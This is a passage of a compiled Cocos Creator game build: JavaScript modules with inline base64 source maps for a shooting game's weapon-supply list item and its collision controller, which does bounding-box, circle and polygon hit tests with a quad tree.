6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgcHJpdmF0ZSBfZm9jdXMgPSAwO1xyXG5cclxuXHJcbiAgICBnZXQgZm9jdXMoKTogbnVtYmVyIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fZm9jdXM7XHJcbiAgICB9XHJcblxyXG4gICAgc2V0IGZvY3VzKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICB0aGlzLl9mb2N1cyA9IHZhbHVlO1xyXG4gICAgICAgIHRoaXMudGFibGVWaWV3TWVkaWF0b3IudXBkYXRlRGF0YSgpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uTG9hZCgpe1xyXG4gICAgICAgIEdhbWVTdXBwbHlJdGVtLmdhbWVTdXBwbHkgPSB0aGlzO1xyXG4gICAgICAgIC8qKiDliqDovb3mlbDmja4gKi9cclxuICAgICAgICB0aGlzLnRhYmxlVmlld01lZGlhdG9yLmRhdGFzID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKS5maWx0ZXIodmFsdWUgPT4gdmFsdWVbJ2lkJ10gIT0gMSkuc29ydCgoYSwgYikgPT5hWydvcmRlciddIC0gYlsnb3JkZXInXSk7XHJcblxyXG4gICAgICAgIGNjLmdhbWUub24oXCJ2aWRlb180XCIsKCk9PntcclxuICAgICAgICAgICAgdGhpcy5vbkNsaWNrVXNlU3VwcGx5RG8oKVxyXG4gICAgICAgIH0sdGhpcyk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHByb3RlY3RlZCBvbkVuYWJsZSgpOiB2b2lkIHtcclxuICAgICAgICBpZiAoT25jZUZsYWcpe1xyXG4gICAgICAgICAgICB0aGlzLnRhYmxlVmlld01lZGlhdG9yLnNob3dBY3Rpb24oKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgT25jZUZsYWcgPSB0cnVlO1xyXG4gICAgICAgIEdhbWVQcm94eS5wYXVzZUdhbWUgPSB0cnVlO1xyXG4gICAgICAgIGlmICghV29ybGQuTXkubmV3Ymllcy5zdGF0ZShcIkZpcnN0RW50cnlTdXBwbHlcIikpe1xyXG4gICAgICAgICAgICB0aGlzLnVzZUd1aWRlTm9kZS54ID0gMDtcclxuICAgICAgICAgICAgbGV0IG5ld2JpZU5vZGUgPSBuZXcgY2MuTm9kZSgpO1xyXG4gICAgICAgICAgICBuZXdiaWVOb2RlLm5hbWUgPSBcIm5ld2JpZU5vZGVcIjtcclxuICAgICAgICAgICAgbmV3YmllTm9kZS5wb3NpdGlvbiA9IHRoaXMudXNlR3VpZGVOb2RlLmNvbnZlcnRUb1dvcmxkU3BhY2VBUihjYy52MigpKTtcclxuICAgICAgICAgICAgY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5hZGRDaGlsZChuZXdiaWVOb2RlKTtcclxuICAgICAgICAgICAgLyoqIGd1aWRlQ2lyY2xlICovXHJcbiAgICAgICAgICAgIGxldCBndWlkZUNpcmNsZVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMoXCJwcmVmYWIvZ3VpZGVDaXJjbGVcIik7XHJcbiAgICAgICAgICAgIGxldCBndWlkZUNpcmNsZU5vZGUgPSBjYy5pbnN0YW50aWF0ZShndWlkZUNpcmNsZVByZWZhYik7XHJcbiAgICAgICAgICAgIGd1aWRlQ2lyY2xlTm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgIG5ld2JpZU5vZGUuYWRkQ2hpbGQoZ3VpZGVDaXJjbGVOb2RlKTtcclxuICAgICAgICAgICAgLyoqIGd1aWRlU2tlICovXHJcbiAgICAgICAgICAgIGxldCBndWlkZVNrZVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMoXCJwcmVmYWIvZ3VpZGVTa2VcIik7XHJcbiAgICAgICAgICAgIGxldCBndWlkZVNrZU5vZGUgPSBjYy5pbnN0YW50aWF0ZShndWlkZVNrZVByZWZhYik7XHJcbiAgICAgICAgICAgIGd1aWRlU2tlTm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgIG5ld2JpZU5vZGUuYWRkQ2hpbGQoZ3VpZGVTa2VOb2RlKTtcclxuICAgICAgICAgICAgdGhpcy51c2VHdWlkZU5vZGUueCA9IDA7XHJcbiAgICAgICAgICAgIHRoaXMudmlkZW9Ob2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgdGhpcy51c2VHdWlkZU5vZGUueCA9IDUwO1xyXG4gICAgICAgICAgICB0aGlzLnZpZGVvTm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIH1cclxuICAgICAgICAvLyB0aGlzLm5vVXNlTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAvLyB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICAvLyB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgzKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAvLyAgICAgdGhpcy5ub1VzZU5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAvLyB9KSkpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tDbG9zZVN1cHBseSgpe1xyXG4gICAgICAgIEdhbWVQcm94eS5wYXVzZUdhbWUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1VzZVN1cHBseShldmVudCwgZGF0YSl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJB2aWRlb+OAkTQg6KOF5aSH6KGl57uZ44CQY2xpY2vjgJFHYW1lU3VwcGx5IFVzZVN1cHBseVwiKVxyXG4gICAgICAgIFxyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuX3ZpZGVvU2lnbj00XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS52aWRlb0FkX3Nob3coKSBcclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrVXNlU3VwcGx5RG8oKXtcclxuICAgICAgICBsZXQgaXRlbSA9IHRoaXMudGFibGVWaWV3TWVkaWF0b3IuZGF0YXNbdGhpcy5fZm9jdXNdO1xyXG4gICAgICAgIGxldCBnYW1lUm9sZUNvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVSb2xlQ29udHJvbGxlciddO1xyXG4gICAgICAgIGdhbWVSb2xlQ29udHJvbGxlci5idWxsZXRFbWl0dGVyID0gaXRlbVsnaWQnXTtcclxuICAgICAgICBnYW1lUm9sZUNvbnRyb2xsZXIuYnVsbGV0RW1pdHRlckRlbGVnYXRlLnBheWxvYWQgPSAoV29ybGQuTXkuYXJtb3J5LnBheWxvYWRBZGRPZihpdGVtWydpZCddKSkgKiAzO1xyXG4gICAgICAgIC8qKiDorr7nva7lvLnlrrnph48gKi9cclxuICAgICAgICB0aGlzLm9uQ2xpY2tDbG9zZVN1cHBseSgpO1xyXG4gICAgICAgIGxldCBuZXdiaWVOb2RlID0gY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5nZXRDaGlsZEJ5TmFtZShcIm5ld2JpZU5vZGVcIik7XHJcbiAgICAgICAgaWYgKG5ld2JpZU5vZGUpe1xyXG4gICAgICAgICAgICBuZXdiaWVOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgV29ybGQuTXkubmV3Ymllcy5maW5pc2goXCJGaXJzdEVudHJ5U3VwcGx5XCIpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBvblRlc3QoKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcImdhbWVTdXBwbHkgdGVzdFwiKVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameSupplyItem.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '897d2HY3ThCFpCJTdoeL/dK', 'GameSupplyItem');
// script/app/game/GameSupplyItem.ts

Object.defineProperty(exports, "__esModule", { value: true });
var AbstractTableItem_1 = require("../../../framework/tableview/AbstractTableItem");
var World_1 = require("../info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameSupplyItem = /** @class */ (function (_super) {
    __extends(GameSupplyItem, _super);
    function GameSupplyItem() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.lockLabel = null;
        _this.bgSprite = null;
        _this.weaponSprite = null;
        _this.nameLabel = null;
        _this.bulletLabel = null;
        _this.numLabel = null;
        _this.weaponSpriteFrames = [];
        _this.bgSpriteFrames = [];
        _this._index = 0;
        _this._data = null;
        return _this;
    }
    GameSupplyItem_1 = GameSupplyItem;
    GameSupplyItem.prototype.upadteItem = function (data, index) {
        this._data = data;
        this._index = index;
        this.bgSprite.spriteFrame = this.bgSpriteFrames[GameSupplyItem_1.gameSupply.focus == index ? 1 : 0];
        this.weaponSprite.spriteFrame = this.weaponSpriteFrames[data['id'] - 1];
        this.nameLabel.string = data['gun_name'];
        this.numLabel.string = World_1.World.My.armory.payloadAddOf(data['id']) + "x3";
        this.lockLabel.string = data['unlock'] + "\u5173\u89E3\u9501";
        var bLock = World_1.World.Storage.gameLevel < data['unlock'];
        this.lockLabel.node.active = bLock;
        this.nameLabel.node.active = !bLock;
        this.weaponSprite.setMaterial(0, cc.Material.getBuiltinMaterial(bLock ? "2d-gray-sprite" : "2d-sprite"));
        this.weaponSprite.node.opacity = bLock ? 128 : 255;
    };
    GameSupplyItem.prototype.onClickButton = function (event, data) {
        console.log("【click】GameSupplyItem Button");
        if (World_1.World.Storage.gameLevel < this._data['unlock']) {
            return;
        }
        GameSupplyItem_1.gameSupply.focus = this._index;
    };
    var GameSupplyItem_1;
    GameSupplyItem.gameSupply = null;
    __decorate([
        property(cc.Label)
    ], GameSupplyItem.prototype, "lockLabel", void 0);
    __decorate([
        property(cc.Sprite)
    ], GameSupplyItem.prototype, "bgSprite", void 0);
    __decorate([
        property(cc.Sprite)
    ], GameSupplyItem.prototype, "weaponSprite", void 0);
    __decorate([
        property(cc.Label)
    ], GameSupplyItem.prototype, "nameLabel", void 0);
    __decorate([
        property(cc.Label)
    ], GameSupplyItem.prototype, "bulletLabel", void 0);
    __decorate([
        property(cc.Label)
    ], GameSupplyItem.prototype, "numLabel", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], GameSupplyItem.prototype, "weaponSpriteFrames", void 0);
    __decorate([
        property(cc.SpriteFrame)
    ], GameSupplyItem.prototype, "bgSpriteFrames", void 0);
    GameSupplyItem = GameSupplyItem_1 = __decorate([
        ccclass
    ], GameSupplyItem);
    return GameSupplyItem;
}(AbstractTableItem_1.default));
exports.default = GameSupplyItem;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZVN1cHBseUl0ZW0udHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9GQUErRTtBQUUvRSx1Q0FBb0M7QUFFOUIsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBNEMsa0NBQWlCO0lBQTdEO1FBQUEscUVBc0RDO1FBakRHLGVBQVMsR0FBWSxJQUFJLENBQUM7UUFHMUIsY0FBUSxHQUFhLElBQUksQ0FBQztRQUcxQixrQkFBWSxHQUFjLElBQUksQ0FBQztRQUcvQixlQUFTLEdBQWEsSUFBSSxDQUFDO1FBRzNCLGlCQUFXLEdBQVksSUFBSSxDQUFDO1FBRzVCLGNBQVEsR0FBWSxJQUFJLENBQUM7UUFHekIsd0JBQWtCLEdBQW9CLEVBQUUsQ0FBQztRQUd6QyxvQkFBYyxHQUFvQixFQUFFLENBQUM7UUFFN0IsWUFBTSxHQUFHLENBQUMsQ0FBQztRQUNYLFdBQUssR0FBRyxJQUFJLENBQUM7O0lBeUJ6QixDQUFDO3VCQXREb0IsY0FBYztJQStCL0IsbUNBQVUsR0FBVixVQUFXLElBQVMsRUFBRSxLQUFhO1FBQy9CLElBQUksQ0FBQyxLQUFLLEdBQUcsSUFBSSxDQUFDO1FBQ2xCLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQ3BCLElBQUksQ0FBQyxRQUFRLENBQUMsV0FBVyxHQUFHLElBQUksQ0FBQyxjQUFjLENBQUMsZ0JBQWMsQ0FBQyxVQUFVLENBQUMsS0FBSyxJQUFJLEtBQUssQ0FBQSxDQUFDLENBQUEsQ0FBQyxDQUFBLENBQUMsQ0FBQSxDQUFDLENBQUMsQ0FBQztRQUM5RixJQUFJLENBQUMsWUFBWSxDQUFDLFdBQVcsR0FBRyxJQUFJLENBQUMsa0JBQWtCLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ3RFLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxVQUFVLENBQUMsQ0FBQztRQUN6QyxJQUFJLENBQUMsUUFBUSxDQUFDLE1BQU0sR0FBTSxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDLE9BQUksQ0FBQztRQUN2RSxJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sR0FBTSxJQUFJLENBQUMsUUFBUSxDQUFDLHVCQUFLLENBQUM7UUFDL0MsSUFBSSxLQUFLLEdBQUcsYUFBSyxDQUFDLE9BQU8sQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQ3JELElBQUksQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDbkMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLENBQUMsS0FBSyxDQUFDO1FBQ3BDLElBQUksQ0FBQyxZQUFZLENBQUMsV0FBVyxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDLGtCQUFrQixDQUFDLEtBQUssQ0FBQSxDQUFDLENBQUEsZ0JBQWdCLENBQUEsQ0FBQyxDQUFBLFdBQVcsQ0FBQyxDQUFDLENBQUM7UUFDckcsSUFBSSxDQUFDLFlBQVksQ0FBQyxJQUFJLENBQUMsT0FBTyxHQUFHLEtBQUssQ0FBQSxDQUFDLENBQUEsR0FBRyxDQUFBLENBQUMsQ0FBQSxHQUFHLENBQUM7SUFDbkQsQ0FBQztJQUVELHNDQUFhLEdBQWIsVUFBYyxLQUFLLEVBQUUsSUFBSTtRQUNyQixPQUFPLENBQUMsR0FBRyxDQUFDLDhCQUE4QixDQUFDLENBQUE7UUFFM0MsSUFBSSxhQUFLLENBQUMsT0FBTyxDQUFDLFNBQVMsR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLFFBQVEsQ0FBQyxFQUFDO1lBQy9DLE9BQU87U0FDVjtRQUNELGdCQUFjLENBQUMsVUFBVSxDQUFDLEtBQUssR0FBRyxJQUFJLENBQUMsTUFBTSxDQUFDO0lBQ2xELENBQUM7O0lBbkRNLHlCQUFVLEdBQWMsSUFBSSxDQUFDO0lBR3BDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7cURBQ087SUFHMUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQztvREFDTTtJQUcxQjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDO3dEQUNXO0lBRy9CO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7cURBQ1E7SUFHM0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQzt1REFDUztJQUc1QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDO29EQUNNO0lBR3pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUM7OERBQ2dCO0lBR3pDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUM7MERBQ1k7SUExQnBCLGNBQWM7UUFEbEMsT0FBTztPQUNhLGNBQWMsQ0FzRGxDO0lBQUQscUJBQUM7Q0F0REQsQUFzREMsQ0F0RDJDLDJCQUFpQixHQXNENUQ7a0JBdERvQixjQUFjIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0IEFic3RyYWN0VGFibGVJdGVtIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvdGFibGV2aWV3L0Fic3RyYWN0VGFibGVJdGVtXCI7XHJcbmltcG9ydCBHYW1lU3VwcGx5IGZyb20gXCIuL0dhbWVTdXBwbHlcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZVN1cHBseUl0ZW0gZXh0ZW5kcyBBYnN0cmFjdFRhYmxlSXRlbSB7XHJcblxyXG4gICAgc3RhdGljIGdhbWVTdXBwbHk6R2FtZVN1cHBseSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkxhYmVsKVxyXG4gICAgbG9ja0xhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgYmdTcHJpdGU6Y2MuU3ByaXRlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgd2VhcG9uU3ByaXRlOiBjYy5TcHJpdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIG5hbWVMYWJlbDogY2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGJ1bGxldExhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBudW1MYWJlbDpjYy5MYWJlbCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlNwcml0ZUZyYW1lKVxyXG4gICAgd2VhcG9uU3ByaXRlRnJhbWVzOltjYy5TcHJpdGVGcmFtZV0gPSBbXTtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlRnJhbWUpXHJcbiAgICBiZ1Nwcml0ZUZyYW1lczpbY2MuU3ByaXRlRnJhbWVdID0gW107XHJcblxyXG4gICAgcHJpdmF0ZSBfaW5kZXggPSAwO1xyXG4gICAgcHJpdmF0ZSBfZGF0YSA9IG51bGw7XHJcblxyXG4gICAgdXBhZHRlSXRlbShkYXRhOiBhbnksIGluZGV4OiBudW1iZXIpIHtcclxuICAgICAgICB0aGlzLl9kYXRhID0gZGF0YTtcclxuICAgICAgICB0aGlzLl9pbmRleCA9IGluZGV4O1xyXG4gICAgICAgIHRoaXMuYmdTcHJpdGUuc3ByaXRlRnJhbWUgPSB0aGlzLmJnU3ByaXRlRnJhbWVzW0dhbWVTdXBwbHlJdGVtLmdhbWVTdXBwbHkuZm9jdXMgPT0gaW5kZXg/MTowXTtcclxuICAgICAgICB0aGlzLndlYXBvblNwcml0ZS5zcHJpdGVGcmFtZSA9IHRoaXMud2VhcG9uU3ByaXRlRnJhbWVzW2RhdGFbJ2lkJ10tMV07XHJcbiAgICAgICAgdGhpcy5uYW1lTGFiZWwuc3RyaW5nID0gZGF0YVsnZ3VuX25hbWUnXTtcclxuICAgICAgICB0aGlzLm51bUxhYmVsLnN0cmluZyA9IGAke1dvcmxkLk15LmFybW9yeS5wYXlsb2FkQWRkT2YoZGF0YVsnaWQnXSl9eDNgO1xyXG4gICAgICAgIHRoaXMubG9ja0xhYmVsLnN0cmluZyA9IGAke2RhdGFbJ3VubG9jayddfeWFs+ino+mUgWA7XHJcbiAgICAgICAgbGV0IGJMb2NrID0gV29ybGQuU3RvcmFnZS5nYW1lTGV2ZWwgPCBkYXRhWyd1bmxvY2snXTtcclxuICAgICAgICB0aGlzLmxvY2tMYWJlbC5ub2RlLmFjdGl2ZSA9IGJMb2NrO1xyXG4gICAgICAgIHRoaXMubmFtZUxhYmVsLm5vZGUuYWN0aXZlID0gIWJMb2NrO1xyXG4gICAgICAgIHRoaXMud2VhcG9uU3ByaXRlLnNldE1hdGVyaWFsKDAsIGNjLk1hdGVyaWFsLmdldEJ1aWx0aW5NYXRlcmlhbChiTG9jaz9cIjJkLWdyYXktc3ByaXRlXCI6XCIyZC1zcHJpdGVcIikpO1xyXG4gICAgICAgIHRoaXMud2VhcG9uU3ByaXRlLm5vZGUub3BhY2l0eSA9IGJMb2NrPzEyODoyNTU7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja0J1dHRvbihldmVudCwgZGF0YSl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJBjbGlja+OAkUdhbWVTdXBwbHlJdGVtIEJ1dHRvblwiKVxyXG5cclxuICAgICAgICBpZiAoV29ybGQuU3RvcmFnZS5nYW1lTGV2ZWwgPCB0aGlzLl9kYXRhWyd1bmxvY2snXSl7XHJcbiAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICB9XHJcbiAgICAgICAgR2FtZVN1cHBseUl0ZW0uZ2FtZVN1cHBseS5mb2N1cyA9IHRoaXMuX2luZGV4O1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameCollisionController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ade4a+D8vBFtrWGh6gZ6Ugw', 'GameCollisionController');
// script/app/game/GameCollisionController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var LooseQuadTree_1 = require("../../quad-tree/LooseQuadTree");
var GameProxy_1 = require("./GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var math = cc.math;
var _vec2 = cc.v2();
function obbApplyMatrix(rect, mat4, out_bl, out_tl, out_tr, out_br) {
    var x = rect.x;
    var y = rect.y;
    var width = rect.width;
    var height = rect.height;
    var m00 = mat4.m0, m01 = mat4.m1, m04 = mat4.m4, m05 = mat4.m5;
    var m12 = mat4.m12, m13 = mat4.m13;
    var tx = m00 * x + m04 * y + m12;
    var ty = m01 * x + m05 * y + m13;
    var xa = m00 * width;
    var xb = m01 * width;
    var yc = m04 * height;
    var yd = m05 * height;
    out_tl.x = tx;
    out_tl.y = ty;
    out_tr.x = xa + tx;
    out_tr.y = xb + ty;
    out_bl.x = yc + tx;
    out_bl.y = yd + ty;
    out_br.x = xa + yc + tx;
    out_br.y = xb + yd + ty;
}
;
var GameCollisionController = /** @class */ (function (_super) {
    __extends(GameCollisionController, _super);
    function GameCollisionController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.enemyBulletLayer = null;
        _this.looseQuadTree = null;
        _this._updateColliders = [];
        return _this;
    }
    GameCollisionController_1 = GameCollisionController;
    GameCollisionController.prototype.onLoad = function () {
        window['GameCollisionController'] = this;
    };
    GameCollisionController.updateCollider = function (collider) {
        var offset = collider.offset;
        var world = collider.world;
        var aabb = world.aabb;
        var m = world.matrix;
        collider.node.getLocalMatrix(m);
        var preAabb = world.preAabb;
        preAabb.x = aabb.x;
        preAabb.y = aabb.y;
        preAabb.width = aabb.width;
        preAabb.height = aabb.height;
        if (collider instanceof cc.BoxCollider) {
            var size = collider.size;
            aabb.x = offset.x - size.width / 2;
            aabb.y = offset.y - size.height / 2;
            aabb.width = size.width;
            aabb.height = size.height;
            var wps = world.points;
            var wp0 = wps[0], wp1 = wps[1], wp2 = wps[2], wp3 = wps[3];
            obbApplyMatrix(aabb, m, wp0, wp1, wp2, wp3);
            var minx = Math.min(wp0.x, wp1.x, wp2.x, wp3.x);
            var miny = Math.min(wp0.y, wp1.y, wp2.y, wp3.y);
            var maxx = Math.max(wp0.x, wp1.x, wp2.x, wp3.x);
            var maxy = Math.max(wp0.y, wp1.y, wp2.y, wp3.y);
            aabb.x = minx;
            aabb.y = miny;
            aabb.width = maxx - minx;
            aabb.height = maxy - miny;
        }
        else if (collider instanceof cc.CircleCollider) {
            // calculate world position
            math.Vec2.transformMat4(_vec2, collider.offset, m);
            world.position.x = _vec2.x;
            world.position.y = _vec2.y;
            // calculate world radius
            var tempx = m.m12, tempy = m.m13;
            m.m12 = m.m13 = 0;
            _vec2.x = collider.radius;
            _vec2.y = 0;
            math.Vec2.transformMat4(_vec2, _vec2, m);
            var d = Math.sqrt(_vec2.x * _vec2.x + _vec2.y * _vec2.y);
            world.radius = d;
            aabb.x = world.position.x - d;
            aabb.y = world.position.y - d;
            aabb.width = d * 2;
            aabb.height = d * 2;
            m.m12 = tempx;
            m.m13 = tempy;
        }
        else if (collider instanceof cc.PolygonCollider) {
            var points = collider.points;
            var worldPoints = world.points;
            worldPoints.length = points.length;
            var minx = 1e6, miny = 1e6, maxx = -1e6, maxy = -1e6;
            for (var i = 0, l = points.length; i < l; i++) {
                if (!worldPoints[i]) {
                    worldPoints[i] = cc.v2();
                }
                _vec2.x = points[i].x + offset.x;
                _vec2.y = points[i].y + offset.y;
                math.Vec2.transformMat4(_vec2, _vec2, m);
                var x = _vec2.x;
                var y = _vec2.y;
                worldPoints[i].x = x;
                worldPoints[i].y = y;
                if (x > maxx)
                    maxx = x;
                if (x < minx)
                    minx = x;
                if (y > maxy)
                    maxy = y;
                if (y < miny)
                    miny = y;
            }
            aabb.x = minx;
            aabb.y = miny;
            aabb.width = maxx - minx;
            aabb.height = maxy - miny;
        }
    };
    GameCollisionController.prototype.update = function (dt) {
        if (GameProxy_1.GameProxy.pauseGame)
            return;
        this.looseQuadTree.updateAll();
        this._updateColliders.forEach(function (value) { return value.bUpdateCollider = false; });
        this._updateColliders.length = 0;
        var gameBulletsController = window['GameBulletsController'];
        /** 与敌人的碰撞 */
        /** 子弹和其他爆炸物 */
        var enemyContacts = gameBulletsController.roleBullets;
        for (var _i = 0, enemyContacts_1 = enemyContacts; _i < enemyContacts_1.length; _i++) {
            var enemyContact = enemyContacts_1[_i];
            if (enemyContact.collider.enabled) {
                GameCollisionController_1.updateCollider(enemyContact.collider);
                /** 获取可能发生碰撞的敌人 */
                var arr = [];
                this.looseQuadTree.retrieve(enemyContact.collider.world.aabb, arr);
                for (var _a = 0, arr_1 = arr; _a < arr_1.length; _a++) {
                    var aabbRegion = arr_1[_a];
                    var enemy = aabbRegion.enemy;
                    if (!aabbRegion.bUpdateCollider) {
                        GameCollisionController_1.updateCollider(enemy.spaceCircleCollider);
                        GameCollisionController_1.updateCollider(enemy.defenceBoxCollider);
                        aabbRegion.bUpdateCollider = true;
                        this._updateColliders.push(aabbRegion);
                    }
                    var bContact = false;
                    if (enemyContact.collider instanceof cc.CircleCollider) {
                        bContact = cc.Intersection.polygonCircle(enemy.defenceBoxCollider.world.points, enemyContact.collider.world);
                    }
                    else {
                        bContact = cc.Intersection.polygonPolygon(enemy.defenceBoxCollider.world.points, enemyContact.collider.world.points);
                    }
                    if (bContact) {
                        // console.log("========>产生了碰撞..");
                        if (!enemyContact.contacts.includes(enemy)) {
                            // console.log("=======>onCollisionEnter");
                            enemyContact.contacts.push(enemy);
                            enemyContact.onCollisionEnter(enemy.defenceBoxCollider, enemyContact.collider);
                            if (!enemyContact.bThrought)
                                break;
                        }
                        else {
                            // console.log("========>onCollisionStay");
                            enemyContact.onCollisionStay(enemy.defenceBoxCollider, enemyContact.collider);
                        }
                    }
                    else {
                        var index = enemyContact.contacts.indexOf(enemy);
                        if (index >= 0) {
                            enemyContact.contacts.splice(index, 1);
                            enemyContact.onCollisionExit(enemy.defenceBoxCollider, enemyContact.collider);
                        }
                    }
                }
            }
        }
        var gameRoleController = window['GameRoleController'];
        /** 与角色的碰撞 */
        var bRoleUpdateCollider = false;
        /** 敌人的子弹 */
        gameBulletsController.enemyBullets.forEach(function (bullet) {
            /** 先过滤掉一些比较远的 */
